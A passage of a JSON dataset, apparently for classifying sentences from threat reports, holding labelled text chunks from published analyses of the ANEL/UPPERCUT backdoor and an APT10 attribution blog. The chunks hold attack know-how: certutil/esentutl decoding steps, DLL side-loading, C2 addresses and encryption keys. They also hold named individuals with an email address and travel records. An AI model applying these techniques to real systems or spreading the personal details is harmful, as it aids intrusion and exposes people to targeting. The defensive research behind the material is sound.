        "text": "For example, the initial ANEL version, \u201c5.0.0 beta1,\u201d uses a different C&C server compared to the other versions. Once ANEL evolved to \u201c5.1.1 rc,\u201d it changed its file type to an executable, while also changing the C&C server. The third version we found (5.1.2 rc1) reverts to a DLL file type but retains the C&C server. The fourth version of ANEL (5.2.0 rev1) changes both the export function in the expanded main ANEL DLL and uses a different C&C server.",
        "source": "ChessMaster Adds Updated Tools to Its Arsenal.html",
        "detection": {
            "response": false,
            "confidence": 0.4746212661266327
        },
        "prediction": {}
    },
    {
        "text": "Overall, we can see subtle changes, which indicate that the threat actors behind ANEL are making incremental improvements to the malware to refine it.\n\nFigure 12.",
        "source": "ChessMaster Adds Updated Tools to Its Arsenal.html",
        "detection": {
            "response": true,
            "confidence": 0.660739004611969
        },
        "prediction": {}
    },
    {
        "text": "Backdoor function differences between ANEL 5.0.0 beta1/5.1.1 rc/5.1.2 rc1 (left) and ANEL 5.2.0 rev1 (right)\n",
        "source": "ChessMaster Adds Updated Tools to Its Arsenal.html",
        "detection": {
            "response": false,
            "confidence": 0.4945196509361267
        },
        "prediction": {}
    },
    {
        "text": "Once ANEL enters the user\u2019s system, it will download various tools that could be used for malicious purposes, including password retrieval tools as well as malicious mail services and accessibility tools that will allow it to gather information about the system.",
        "source": "ChessMaster Adds Updated Tools to Its Arsenal.html",
        "detection": {
            "response": true,
            "confidence": 0.6980910301208496
        },
        "prediction": {}
    },
    {
        "text": "It also downloads the following:\n\nAccevent.exe <-> Microsoft Accessible Event Watcher 7.2.0.0\nevent.dll <-> the loader of ssssss.ddd, (Detected as TROJ_ANELLDR)\nssssss.ddd (lena_http.bin) <-> encrypted BKDR_ANEL (Detected as BKDR_ANELENC)\n\nThese three files work together using a common technique call DLL Side-Loading or DLL Hijacking.",
        "source": "ChessMaster Adds Updated Tools to Its Arsenal.html",
        "detection": {
            "response": false,
            "confidence": 0.3681965470314026
        },
        "prediction": {}
    },
    {
        "text": "In this scenario, accevent.exe is the primary executable, which is usually legitimate.\n After the execution of accevent.exe, it loads event.dll, which will be placed in the same folder (so it takes loading priority), after which event.dll decrypts and loads the encrypted backdoor ssssss.ddd, which is BKDR_ANEL.",
        "source": "ChessMaster Adds Updated Tools to Its Arsenal.html",
        "detection": {
            "response": false,
            "confidence": 0.433349072933197
        },
        "prediction": {}
    },
    {
        "text": "When we analyzed ANEL 5.1.1 rc, encrypted ANEL 5.1.2 rc1 was downloaded and executed.\nShort-term mitigation\nWhen the user opens the document DDEAUTO or Link Auto Update, Office will display a message.",
        "source": "ChessMaster Adds Updated Tools to Its Arsenal.html",
        "detection": {
            "response": true,
            "confidence": 0.5644598007202148
        },
        "prediction": {}
    },
    {
        "text": "Figure 13: Popup message when users open the document that abuses DDEAUTO\n\nFigure 14. Popup message when the user opens the document that abuses Link Auto Update\nKoadic sends its own JavaScript code as plain text. The suspect communication allows us to detect the traffic.\n\n",
        "source": "ChessMaster Adds Updated Tools to Its Arsenal.html",
        "detection": {
            "response": true,
            "confidence": 0.6720080375671387
        },
        "prediction": {}
    },
    {
        "text": "Koadic\u2019s communication traffic\nMedium- to long-term mitigation\nAt first glance, it seems ChessMaster\u2019s evolution over the past few months involves subtle changes.",
        "source": "ChessMaster Adds Updated Tools to Its Arsenal.html",
        "detection": {
            "response": true,
            "confidence": 0.6022782325744629
        },
        "prediction": {}
    },
    {
        "text": "However, the constant addition and changing of features and attack vectors indicate that the attackers behind the campaign are unlikely to stop and are constantly looking to evolve their tools and tactics.\n\n Organizations can implement various techniques and best practices to defend against targeted attacks, such as regular patching to prevent vulnerability exploitation and using tools that provide protection across different network levels.",
        "source": "ChessMaster Adds Updated Tools to Its Arsenal.html",
        "detection": {
            "response": true,
            "confidence": 0.6137774586677551
        },
        "prediction": {}
    },
    {
        "text": "Solutions that feature behavior monitoring,\u00a0application control,\u00a0email gateway monitoring, and intrusion/detection systems can help with this.\n",
        "source": "ChessMaster Adds Updated Tools to Its Arsenal.html",
        "detection": {
            "response": false,
            "confidence": 0.48920777440071106
        },
        "prediction": {}
    },
    {
        "text": "Given how cybercriminal tools, tactics and procedures are evolving, organizations will have to go beyond their typical day-to-day security requirements and find a way to preempt attacks. Thus, there is a pressing need to detect and address threats via a\u00a0proactive incident response strategy. Essentially, this involves creating a remediation plan for effectively combating the threat and using round-the-clock intrusion detection and threat analysis to prevent attacks from entering the system.",
        "source": "ChessMaster Adds Updated Tools to Its Arsenal.html",
        "detection": {
            "response": true,
            "confidence": 0.5390689969062805
        },
        "prediction": {}
    },
    {
        "text": "A proactive strategy can be much more effective for targeted attacks, as these kinds of attacks are often designed to be elusive and difficult to detect, thus the need to scope them out. A comprehensive security strategy that involves proactive incident response will need the input of both decision makers and tech-savvy personnel, as they will need to be on the same page for it to be effective.\n In addition to implementing both mitigation techniques and proactive strategies, organizations can also strengthen their security by employing solutions such Trend Micro\u2122 Deep Security\u2122 and TippingPoint, which protects endpoints from threats that abuse vulnerabilities.\n In addition, comprehensive security solutions can be used to protect organizations from attacks.",
        "source": "ChessMaster Adds Updated Tools to Its Arsenal.html",
        "detection": {
            "response": false,
            "confidence": 0.4387046992778778
        },
        "prediction": {}
    },
    {
        "text": "These include Trend Micro endpoint solutions such as\u00a0Trend Micro\u2122\u00a0Smart Protection Suites and\u00a0Worry-Free\u2122\u00a0Business Security, which\u00a0can protect users and businesses from these threats by detecting malicious files, well as blocking all related malicious URLs.\u00a0 Trend Micro\u00a0Deep Discovery\u2122 can protect enterprises by detecting malicious attachment and URLs.\n Trend Micro\u00a0OfficeScan\u2122 with\u00a0XGen\u2122 endpoint security infuses high-fidelity machine learning with other detection technologies and global threat intelligence for comprehensive protection against all kinds of threats. A more detailed analysis of the Command-and-Control communication flow of ANEL can be found in this technical brief.\n",
        "source": "ChessMaster Adds Updated Tools to Its Arsenal.html",
        "detection": {
            "response": false,
            "confidence": 0.437919944524765
        },
        "prediction": {}
    },
    {
        "text": "Vi\u1ec7t Nam\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nPrivacy | Legal | Accessibility | Site map\n\n\n\n\n\nCopyright \u00a92023 Trend Micro Incorporated. All rights reserved\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nsXpIBdPeKzI9PC2p0SWMpUSM2NSxWzPyXTMLlbXmYa0R20xk\n\n\n\n\nCliccando su \u201cAccetta tutti i cookie\u201d, l'utente accetta di memorizzare i cookie sul dispositivo per migliorare la navigazione del sito, analizzare l'utilizzo del sito e assistere nelle nostre attivit\u00e0 di marketing.",
        "source": "ChessMaster Adds Updated Tools to Its Arsenal.html",
        "detection": {
            "response": false,
            "confidence": 0.22471922636032104
        },
        "prediction": {}
    },
    {
        "text": "\n\nAPT10 Targets Japanese Corporations | UPPERCUT backdoormandiant.com uses cookies to deliver and enhance the quality of its services and to analyze traffic.",
        "source": "APT10 Targets Japanese Corporations _ UPPERCUT backdoor.html",
        "detection": {
            "response": true,
            "confidence": 0.589989960193634
        },
        "prediction": {}
    },
    {
        "text": "If you agree, cookies are also used to serve advertising and to personalize the content and advertisements that you see.",
        "source": "APT10 Targets Japanese Corporations _ UPPERCUT backdoor.html",
        "detection": {
            "response": true,
            "confidence": 0.6290023922920227
        },
        "prediction": {}
    },
    {
        "text": "Platform   Solutions   Intelligence   Services   Resources   Company Mandiant AdvantageExplore our multi-vendor XDR platform, delivering Mandiant products and integrating with a range of leading security operations technology. Explore the platformarrow_forward Start with free account   Attack Surface Management Free\u00a0Subscription Map your external environment   Breach Analytics for Chronicle Know what we know when we know it   Security Validation Validate controls are working properly   Threat Intelligence Free\u00a0Subscription Access latest intel from the frontlines   Digital Threat Monitoring Visibility into deep, dark, and open web   Managed Defense Managed detection and response Mandiant SolutionsSolve your toughest cyber security challenges with combinations of products and services. Featured solutionsarrow_forwardBy use casearrow_forwardBy industryarrow_forward   Featured solutions   Proactive Exposure Management New!Reduce exposures before adversaries act   Government New!Protect national services and agencies   Digital Risk ProtectionPrioritize and focus on threats that matter   RansomwareIncrease resilience against ransomware and multifaceted extortion   Know Who is Targeting YouPrioritize threats that matter",
        "source": "APT10 Targets Japanese Corporations _ UPPERCUT backdoor.html",
        "detection": {
            "response": false,
            "confidence": 0.32092228531837463
        },
        "prediction": {}
    },
    {
        "text": "Contact us   Careers Life at Mandiant and open roles   Media Center Press releases and news mentions   Partners Ecosystem and resources   Elevate Empowering women in cyber security   Mandiant Gives Back Our commitment to a better future              Create a free accountSign in to Advantage  en  expand_more   English Fran\u00e7ais Deutsch Italiano \u65e5\u672c \ud55c\uad6d\uc5b4 Espa\u00f1olStart for Free        Search   Submit search form    Search   Submit search form  PlatformMandiant Advantage OverviewBreach Analytics for ChronicleSecurity ValidationAttack Surface ManagementThreat IntelligenceDigital Threat MonitoringManaged DefenseSolutionsProactive Exposure ManagementGovernmentRansomwareKnow",
        "source": "APT10 Targets Japanese Corporations _ UPPERCUT backdoor.html",
        "detection": {
            "response": false,
            "confidence": 0.3858955502510071
        },
        "prediction": {}
    },
    {
        "text": "If You Have Been BreachedCyber Risk ManagementDigital Risk ProtectionOT/ICS SecurityInsider ThreatsCyber Security Skills GapFinanceManufacturingElection SecurityIntelligenceIntelligence resourcesThreat IntelligenceDigital Threat MonitoringIntelligence Capability DevelopmentIntelligence TrainingExecutive BriefingsAdvanced Intelligence AccessServicesServices OverviewIncident ResponseStrategic ReadinessCyber Security TransformationTechnical AssuranceView all Services (48)Mandiant AcademyFind a CourseExpertise",
        "source": "APT10 Targets Japanese Corporations _ UPPERCUT backdoor.html",
        "detection": {
            "response": false,
            "confidence": 0.4152478873729706
        },
        "prediction": {}
    },
    {
        "text": "Gives BackNoteholder and Preferred Shareholder DocumentsMobile Footer SectionSee what\u2019s new at MandiantGet startedIncident Response HelpContact SalesSupportSign InCreate a Free Mandiant Advantage AccountTop Incident Response Contact sales Support Advantage Free Trial \u00a0BlogSupportContact usreport_problemIncident Response Assistance    Breadcrumb Home APT10 Targeting Japanese Corporations Using Updated TTPs   Threat Research APT10 Targeting Japanese Corporations Using Updated TTPsAyako Matsuda, Irshad Muhammad Sep 13, 20186 min\u00a0read |\u00a0\u00a0   Last updated: Aug 10, 2023 Advanced Persistent Threats (APTs)TTPsThreat ResearchMalwareIntroductionIn July 2018, FireEye devices detected and blocked what appears to be APT10 (Menupass) activity targeting the Japanese media sector. APT10 is a Chinese cyber espionage group that FireEye has tracked since 2009, and they have a history of targeting Japanese entities. In this campaign, the group sent spear phishing emails containing malicious documents that led to the installation of the UPPERCUT backdoor.",
        "source": "APT10 Targets Japanese Corporations _ UPPERCUT backdoor.html",
        "detection": {
            "response": false,
            "confidence": 0.220835879445076
        },
        "prediction": {}
    },
    {
        "text": "This backdoor is well-known in the security community as ANEL, and it used to come in beta or RC (release candidate) until recently.",
        "source": "APT10 Targets Japanese Corporations _ UPPERCUT backdoor.html",
        "detection": {
            "response": true,
            "confidence": 0.6029267311096191
        },
        "prediction": {}
    },
    {
        "text": "Part of this blog post will discuss the updates and differences we have observed across multiple versions of this backdoor.",
        "source": "APT10 Targets Japanese Corporations _ UPPERCUT backdoor.html",
        "detection": {
            "response": true,
            "confidence": 0.6941851377487183
        },
        "prediction": {}
    },
    {
        "text": "Attack OverviewThe attack starts with Microsoft Word documents containing a malicious VBA macro being attached to spear phishing emails.",
        "source": "APT10 Targets Japanese Corporations _ UPPERCUT backdoor.html",
        "detection": {
            "response": true,
            "confidence": 0.6859056353569031
        },
        "prediction": {}
    },
    {
        "text": "Although the contents of the malicious documents are unreadable (see Figure 3), the Japanese titles are related to maritime, diplomatic, and North Korean issues. Table 1 shows the UPPERCUT indicators of compromise (IoCs).File NameMD5SizeC2\u81ea\u6c11\u515a\u6d77\u6d0b\u7dcf\u5408\u6226\u7565\u5c0f\u59d4\u54e1\u4f1a\u304c\u653f\u5e9c\u306b\u63d0\u8a00\u7533\u3057\u5165\u308c.docGovernment Recommendations from the Liberal Democratic Party\u2019s Comprehensive Strategic Maritime Subcommittee4f83c01e8f7507d23c67ab085bf79e97843022eservake.jetos[.]com82.221.100.52151.106.53.147\u30b0\u30c6\u30de\u30e9\u5927\u4f7f\u8b1b\u6f14\u4f1a\u6848\u5185\u72b6.docInvitation to Lecture by Guatemalan Ambassadorf188936d2c8423cf064d6b8160769f21720384\u00a0eservake.jetos[.]com151.106.53.147153.92.210.208\u00a0\u7c73\u56fd\u63a5\u8fd1\u306b\u63fa\u308c\u308b\u5317\u671d\u9bae\u5185\u90e8.docNorth Korean interior swayed by the approach of the United Statescca227f70a64e1e7fcf5bccdc6cc25dd733184eservake.jetos[.]com153.92.210.208167.99.121.203Table 1: UPPERCUT IoCsFor the North Korean lure, a news article with an identical title was readily available online. It\u2019s also worth noting that in the Guatemalan lure, the attacker used an unusual spelling of Guatemala in Japanese. The top result of a Google search using the same spelling led us to the event website for the lecture of the Guatemalan Ambassador, held in August 2018. Figure 1 shows the screenshot of the event page. Figure 1: Event Website for the Lecture of Guatemala AmbassadorFigure 2 shows the macro function that displays the lure document. At the bottom of this function, we can see the readable text that matches the contact information found in Figure 1. Thus, people who would have an interest in Latin American issues may have been the targets of this campaign.",
        "source": "APT10 Targets Japanese Corporations _ UPPERCUT backdoor.html",
        "detection": {
            "response": false,
            "confidence": 0.08793950825929642
        },
        "prediction": {}
    },
    {
        "text": "Figure 2: Macro to display lure documentThe initial Word documents were password protected, likely in an effort to bypass detection. Once the password (delivered in the body of the email) is entered, the users are presented with a document that will request users to enable the malicious macro, as shown in Figure 3.Figure 3: Lure documentFigure 4 shows what happens when the malicious macro is executed.",
        "source": "APT10 Targets Japanese Corporations _ UPPERCUT backdoor.html",
        "detection": {
            "response": true,
            "confidence": 0.5798891186714172
        },
        "prediction": {}
    },
    {
        "text": "The macro drops three PEM files, padre1.txt, padre2.txt, and padre3.txt, to the victim\u2019s %TEMP% folder and then copies them from %TEMP% to the %AllUserProfile% folder.2.\u00a0\u00a0\u00a0\u00a0  The macro decodes the dropped files using Windows certutil.exe with the following commands (certutil.exe is a legitimate built-in command-line program to manage certificates in Windows):C:\\Windows\\System32\\cmd.exe\" /c",
        "source": "APT10 Targets Japanese Corporations _ UPPERCUT backdoor.html",
        "detection": {
            "response": true,
            "confidence": 0.5509597659111023
        },
        "prediction": {}
    },
    {
        "text": "The macro creates a copy of the files with their proper extensions using Extensible Storage Engine Utilities (esentutil.exe) with the following commands (esentutil.exe is also a legitimate program that is pre-installed in Windows):C:\\Windows\\System32\\esentutl.exe\" /y",
        "source": "APT10 Targets Japanese Corporations _ UPPERCUT backdoor.html",
        "detection": {
            "response": true,
            "confidence": 0.5478711724281311
        },
        "prediction": {}
    },
    {
        "text": "/y C:\\ProgramData\\\\libcurl.txt /d C:\\ProgramData\\libcurl.dll /oThe dropped files include the following:GUP.exe\u00a0:\u00a0GUP, a free (LGPL) Generic Updater.\u00a0",
        "source": "APT10 Targets Japanese Corporations _ UPPERCUT backdoor.html",
        "detection": {
            "response": false,
            "confidence": 0.49545779824256897
        },
        "prediction": {}
    },
    {
        "text": "The version used here is version 4.1 digitally signed by Notepad++, as shown in Figure 5.libcurl.dll:\u00a0Malicious Loader DLL3F2E3AB9:\u00a0Encrypted shellcodeFigure 5: Notepad++ signed updater4.\u00a0\u00a0\u00a0\u00a0 ",
        "source": "APT10 Targets Japanese Corporations _ UPPERCUT backdoor.html",
        "detection": {
            "response": false,
            "confidence": 0.4721948504447937
        },
        "prediction": {}
    },
    {
        "text": "The executable sideloads the malicious DLL (libcurl.dll), which decrypts and runs shellcode (3F2E3AB9) located in the same folder. The shellcode decodes and decompresses another DLL, which is an updated variant of UPPERCUT. Before decoding the DLL, the shellcode uses an anti-debug technique based on ntdll_NtSetInformationThread which causes the thread to be detached from the debugger, as shown in Figure 6.",
        "source": "APT10 Targets Japanese Corporations _ UPPERCUT backdoor.html",
        "detection": {
            "response": false,
            "confidence": 0.4595642387866974
        },
        "prediction": {}
    },
    {
        "text": "The DLL is then loaded into memory and the randomly named exported function is called.",
        "source": "APT10 Targets Japanese Corporations _ UPPERCUT backdoor.html",
        "detection": {
            "response": true,
            "confidence": 0.7677910327911377
        },
        "prediction": {}
    },
    {
        "text": "The macro deletes the initially dropped .txt files using Windows esentutl.exe and changes the document text to an embedded message. The complete attack overview is shown in Figure 7.Figure 7: Attack overviewSeveral threat actors leverage the technique of using Windows certutil.exe for payload decoding, and APT10 continues to employ this technique.",
        "source": "APT10 Targets Japanese Corporations _ UPPERCUT backdoor.html",
        "detection": {
            "response": true,
            "confidence": 0.5911246538162231
        },
        "prediction": {}
    },
    {
        "text": "The PE compile time of loaders and the create time of droppers (Word documents) are plotted in the graph.",
        "source": "APT10 Targets Japanese Corporations _ UPPERCUT backdoor.html",
        "detection": {
            "response": true,
            "confidence": 0.7008122801780701
        },
        "prediction": {}
    },
    {
        "text": "The compile time of loaders in the newer version(s) are not shown here since the timestamps are overwritten and filled with zeroes.",
        "source": "APT10 Targets Japanese Corporations _ UPPERCUT backdoor.html",
        "detection": {
            "response": true,
            "confidence": 0.6926841139793396
        },
        "prediction": {}
    },
    {
        "text": "We don\u2019t have visibility into UPPERCUT 5.2.x series, but it\u2019s possible that minor revisions were released every few months between December 2017 and May 2018.Figure 8: Timeline of UPPERCUT updatesUnlike previous versions, the exported function names are randomized in the latest version (Table 2).Encoded PayloadDecoded PayloadMD5SizeImport HashExported FunctionVersionaa3f303c3319b14b4829fe2faa5999c1322164182ee99b4f0803628c30411b1faa9992l7MF25T96n45qOGWX5.3.2126067d634d94c45084cbe1d9873d8953308045f45532f947501cf024d84c36e3a19a1hJvTJcdAU3mNkuvGGq7L5.4.1fce54b4886cac5c61eda1e7605483ca3345812c1942a0ca397b627019dace26eca78d8WcuH5.4.1Table 2: Static characteristics of UPPERCUTAnother new feature in the latest UPPERCUT sample is that the malware sends an error code in the Cookie header if it fails to receive the HTTP response from the command and control (C2) server.",
        "source": "APT10 Targets Japanese Corporations _ UPPERCUT backdoor.html",
        "detection": {
            "response": false,
            "confidence": 0.24421679973602295
        },
        "prediction": {}
    },
    {
        "text": "The error code is the value returned by the GetLastError function and sent in the next beacon.",
        "source": "APT10 Targets Japanese Corporations _ UPPERCUT backdoor.html",
        "detection": {
            "response": true,
            "confidence": 0.7525242567062378
        },
        "prediction": {}
    },
    {
        "text": "This was likely included to help the attackers understand the problem if the backdoor is unable to receive a response (Figure 9).",
        "source": "APT10 Targets Japanese Corporations _ UPPERCUT backdoor.html",
        "detection": {
            "response": true,
            "confidence": 0.751575767993927
        },
        "prediction": {}
    },
    {
        "text": "This Cookie header is a unique indicator that can be used for network-based detection. Figure 9: Example of callbackEarlier versions of UPPERCUT used the hard-coded string \u201cthis is the encrypt key\u201d for Blowfish encryption when communicating with a C2. However, in the latest version, the keys are hard-coded uniquely for each C2 address and use the C2\u2019s calculated MD5 hash to determine which key to use, as shown in Figure 10.Figure 10: Blowfish key generationFor instance, Table 3\u00a0lists the hard-coded C2 addresses, their MD5 hash, and the corresponding Blowfish key in the decoded payload of 126067d634d94c45084cbe1d9873d895.C2MD5Blowfish Keyhxxp[:]//151.106.53[.]147/VxQGf613846eb5bed227ec1a5f8df7e678d0bdc4b9f5af9868e028dd0adc10099a4e6656e9f0ad12b2e75a30f5ca0e34489dhxxp[:]//153.92.210[.]208/wBNh150c60f37922ff2ff8733aaeaa9802da5fb9f7fb3c709373523ff27824ed6a31d800e275ec5217d8a11024a3dffb577ddhxxp[:]//eservake.jetos[.]com/qIDjc500dae1ca41236830b59f1467ee96c1d3450966ceb2eba93282aace7d7684380d87c6621bbd3c4f621caa079356004aDefault\u00a0Defaultf12df6984bb65d18e2561bd017df29ee1cf946efa5e510802005aeee9035dd53Table 3: Example of Blowfish keysIn this example, the MD5 hash of hxxp[:]//151.106.53[.]147/VxQG will be f613846eb5bed227ec1a5f8df7e678d0.",
        "source": "APT10 Targets Japanese Corporations _ UPPERCUT backdoor.html",
        "detection": {
            "response": false,
            "confidence": 0.12686870992183685
        },
        "prediction": {}
    },
    {
        "text": "When the malware interacts with this URL, bdc4b9f5af9868e028dd0adc10099a4e6656e9f0ad12b2e75a30f5ca0e34489d will be selected as a Blowfish key. If the MD5 hash of the URL does not match any of the listed hashes, then the default key f12df6984bb65d18e2561bd017df29ee1cf946efa5e510802005aeee9035dd53 will be used.",
        "source": "APT10 Targets Japanese Corporations _ UPPERCUT backdoor.html",
        "detection": {
            "response": false,
            "confidence": 0.48128387331962585
        },
        "prediction": {}
    },
    {
        "text": "Another difference in the network traffic generated from the malware is that the encoded proxy information has been added in the URL query values during the C2 communication.",
        "source": "APT10 Targets Japanese Corporations _ UPPERCUT backdoor.html",
        "detection": {
            "response": true,
            "confidence": 0.7516184449195862
        },
        "prediction": {}
    },
    {
        "text": "Table 4 shows the parameters sent to C2 server from the backdoor in the newer versions.",
        "source": "APT10 Targets Japanese Corporations _ UPPERCUT backdoor.html",
        "detection": {
            "response": true,
            "confidence": 0.7743915319442749
        },
        "prediction": {}
    },
    {
        "text": "These are sent via POST request, as shown in Figure 9.Table 4: URL parametersAdditionally, the command string is hashed using the same RGPH hashing algorithm as before.",
        "source": "APT10 Targets Japanese Corporations _ UPPERCUT backdoor.html",
        "detection": {
            "response": true,
            "confidence": 0.6202884316444397
        },
        "prediction": {}
    },
    {
        "text": "Two more commands, 0xD290626C85FB1CE3 and 0x409C7A89CFF0A727, are supported in the newer versions (Table 5).CommandsDescription0x97A168D9697D40DDDownload and validate file (XXHash comparison) from C2 server0x7CF812296CCC68D5Upload file to C2 server0x652CB1CEFF1C0A00Load",
        "source": "APT10 Targets Japanese Corporations _ UPPERCUT backdoor.html",
        "detection": {
            "response": false,
            "confidence": 0.37593308091163635
        },
        "prediction": {}
    },
    {
        "text": "PE file0x27595F1F74B55278Download, validate (XXHash comparison), execute file, and send output to C2 server0xD290626C85FB1CE3Format the current timestamp0x409C7A89CFF0A727Capture the desktop screenshot in PNG format and send it to C2None of the aboveThe received buffer is executed via cmd.exe and the output is then sent to the C2 serverTable 5: Supported commandsConclusionWhile APT10 consistently targets the same geolocation and industry, the malware they use is actively evolving.",
        "source": "APT10 Targets Japanese Corporations _ UPPERCUT backdoor.html",
        "detection": {
            "response": false,
            "confidence": 0.42128506302833557
        },
        "prediction": {}
    },
    {
        "text": "In the newer versions of UPPERCUT, there is a significant change in the way backdoor initializes the Blowfish encryption key, which makes it harder for analysts to detect and decrypt the backdoor\u2019s network communications.",
        "source": "APT10 Targets Japanese Corporations _ UPPERCUT backdoor.html",
        "detection": {
            "response": true,
            "confidence": 0.7035565972328186
        },
        "prediction": {}
    },
    {
        "text": "To mitigate the threat, users are advised to disable Office macros in their settings and not to open documents from unknown sources.",
        "source": "APT10 Targets Japanese Corporations _ UPPERCUT backdoor.html",
        "detection": {
            "response": true,
            "confidence": 0.6299455165863037
        },
        "prediction": {}
    },
    {
        "text": "FireEye Multi-Vector Execution (MVX) engine is able to recognize and block this threat with the following detection names:APT.Backdoor.",
        "source": "APT10 Targets Japanese Corporations _ UPPERCUT backdoor.html",
        "detection": {
            "response": true,
            "confidence": 0.5392794609069824
        },
        "prediction": {}
    },
    {
        "text": "UPPERCUTFE_APT_Backdoor_Win32_UPPERCUT Link to RSS feedPrepare for 2024's cybersecurity landscape. Get the Google Cloud Cybersecurity Forecast 2024 report to explore the latest trends on the horizon.",
        "source": "APT10 Targets Japanese Corporations _ UPPERCUT backdoor.html",
        "detection": {
            "response": true,
            "confidence": 0.5973762273788452
        },
        "prediction": {}
    },
    {
        "text": "Mandiant Advantage Platform Platform Overview Breach Analytics for Chronicle Security Validation Attack Surface Management Threat Intelligence Digital Threat Monitoring Managed Defense Solutions Proactive Exposure Management Ransomware Industrial Controls & OT Cyber Risk Management Digital Risk Protection Insider Threats Cyber Security Skills Gap Election Security Government Cyber Security Manufacturing Cyber Threat Visibility Attack Surface Visibility Cyber Preparedness Detection and Response Financial Services Cyber Security Services Services Overview Incident Response Strategic Readiness Cyber Security Transformation Technical Assurance View all Services (48) Expertise on Demand Mandiant Academy Overview Education Formats Upcoming Courses On-Demand Courses Certifications ThreatSpace Cyber Range Free Course Sneak Peaks Resources Resource Center Blog Podcasts  Customer Stories Reports Webinars Insights eBooks Infographics White Papers Datasheets Company About Us Careers Events Media Center Noteholder and Preferred Shareholder Documents Partners Partners Overview Technology Partners Cyber Risk Partners Service Partners Channel Partners Partner Portal Connect with Mandiant Contact Us Report an Incident Customer Support Email Preferences Customer Success Media Inquiries  REPORTMandiant frontline observations provide insights into today\u2019s top cyber defense topics.",
        "source": "APT10 Targets Japanese Corporations _ UPPERCUT backdoor.html",
        "detection": {
            "response": false,
            "confidence": 0.2251885086297989
        },
        "prediction": {}
    },
    {
        "text": "\n\n\n\n\n\n\nAPT10 was managed by the Tianjin bureau of the Chinese Ministry of State Security \u2013 Intrusion Truth\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nSkip to content\n\nHome\n\n\t\t\tMenu\t\t\n\n\nAPT10 was managed by the Tianjin bureau of the Chinese Ministry of State\u00a0Security\n\nintrusiontruth \n\t\t\t\tin APT10 \nAugust 15, 2018August 15, 2018\n609 Words\n\n\n\n\n\n\n\n\n\n\n\n\nIn previous posts, Intrusion Truth showed that the Cloud Hopper / APT10 hackers that attacked thousands of global clients of Managed Service Providers (MSPs) in 2016 were based in Tianjin, China.\n We identified Zheng Yanbin, Gao Qiang and Zhang Shilong as three actors responsible. We associated them with the Huaying Haitai Science and Technology Development Co Ltd (\u5929\u6d25\u534e\u76c8\u6d77\u6cf0\u79d1\u6280\u53d1\u5c55\u6709\u9650\u516c\u53f8) and Laoying Baichen Instruments Equipment Co Ltd in Tianjin China.",
        "source": "APT10 was managed by the Tianjin bureau of the Chinese Ministry of State Security \u2013 Intrusion Truth.html",
        "detection": {
            "response": false,
            "confidence": 0.16266512870788574
        },
        "prediction": {}
    },
    {
        "text": "In the course of our investigation over the last year, we engaged with several Cyber Threat Intelligence analysts who provided both raw data and analysis to our team. Amongst the data provided to us recently was evidence that Gao Qiang has been working with the Chinese state.",
        "source": "APT10 was managed by the Tianjin bureau of the Chinese Ministry of State Security \u2013 Intrusion Truth.html",
        "detection": {
            "response": true,
            "confidence": 0.670480489730835
        },
        "prediction": {}
    },
    {
        "text": "Journeys to 85 Zhujiang Road\n\u5f3a\u2019s travel from work at Huaying Haitai to Xiqing District.\n",
        "source": "APT10 was managed by the Tianjin bureau of the Chinese Ministry of State Security \u2013 Intrusion Truth.html",
        "detection": {
            "response": true,
            "confidence": 0.5391667485237122
        },
        "prediction": {}
    },
    {
        "text": "This image, which was provided by an analyst who prefers not to be named publicly (but whose identity we have independently verified), shows an Uber receipt addressed to a user called \u2018Qiang\u2019 (\u5f3a) and\u00a0bears the e-mail address 420192[at]qq.com, an account that we believe to be used by APT10 actor Gao Qiang.\n",
        "source": "APT10 was managed by the Tianjin bureau of the Chinese Ministry of State Security \u2013 Intrusion Truth.html",
        "detection": {
            "response": false,
            "confidence": 0.48040154576301575
        },
        "prediction": {}
    },
    {
        "text": "The receipt shows travel at the end of the working day between 384 Jiefang South Road (\u89e3\u653e\u5357\u8def) \u2013 immediately outside the Fuyu Mansion address of Huaying Haitai \u2013 and a destination in what appears to be a residential area of the Xiqing District of Tianjin just south of the Waihuan River.",
        "source": "APT10 was managed by the Tianjin bureau of the Chinese Ministry of State Security \u2013 Intrusion Truth.html",
        "detection": {
            "response": true,
            "confidence": 0.6648579835891724
        },
        "prediction": {}
    },
    {
        "text": "We have blacked out the exact street number in the image.\u00a0  This map shows the location of the start of the journey, outside the Fuyu Mansion buildings.\n The collection address outside the Fuyu Mansion Buildings, home of Huaying Haitai\nThis second Uber receipt, provided by the same analyst, shows further travel by the same user, though here he uses the name \u2018Pig\u2019 (\u732a). This could be some attempt to disguise the nature of the journey, though readers will note the same QQ e-mail address is used.\n",
        "source": "APT10 was managed by the Tianjin bureau of the Chinese Ministry of State Security \u2013 Intrusion Truth.html",
        "detection": {
            "response": true,
            "confidence": 0.55019611120224
        },
        "prediction": {}
    },
    {
        "text": "\u732a\u2019s travel between Xiqing District and 85 Zhujiang Road\nIn this case the journey is between the same residential area in the Xiqing District and a large complex at 85 Zhujiang Road (\u73e0\u6c5f\u9053), Tianjin.\n According to the rest of the data revised by analysts working for this blog, this was one of a number of journeys made by the user to/from the same complex on Zhujiang Road.\n\n Tianjin State Security Bureau\n85 Zhujiang Road is an important address in Tianjin \u2013 it is the headquarters of the Tianjin State Security Bureau (\u5929\u6d25\u5e02\u56fd\u5bb6\u5b89\u5168\u5c40), a regional arm of the Ministry of State Security (MSS). MSS is the same Chinese Intelligence Service that was tasking APT3 via a cover company managed by its office in Guangdong.\n The large complex visited by Gao Qiang at 85 Zhujiang Road, Tianjin\nThis looks like what it is \u2013 an exact copy of the APT3 model. This was a large scale infiltration of western infrastructure conducted by a team of Chinese citizens working for a small company with links to the Chinese Intelligence Service, MSS.",
        "source": "APT10 was managed by the Tianjin bureau of the Chinese Ministry of State Security \u2013 Intrusion Truth.html",
        "detection": {
            "response": false,
            "confidence": 0.2544756233692169
        },
        "prediction": {}
    },
    {
        "text": "It is the second time that this blog has proven a link between a damaging APT group and the Chinese state (and it certainly won\u2019t be the last).\n",
        "source": "APT10 was managed by the Tianjin bureau of the Chinese Ministry of State Security \u2013 Intrusion Truth.html",
        "detection": {
            "response": true,
            "confidence": 0.7266331315040588
        },
        "prediction": {}
    },
    {
